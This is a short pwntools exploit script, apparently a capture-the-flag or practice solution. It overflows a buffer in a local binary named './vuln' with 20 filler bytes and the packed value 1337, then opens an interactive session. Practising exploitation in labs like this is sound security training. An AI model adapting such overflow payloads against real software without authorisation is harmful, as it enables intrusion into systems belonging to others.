from pwn import *

io = process('./vuln')

payload = b'a'*20 + p32(1337) # "\x39\x05\x00\x00"
io.sendline(payload)
io.interactive()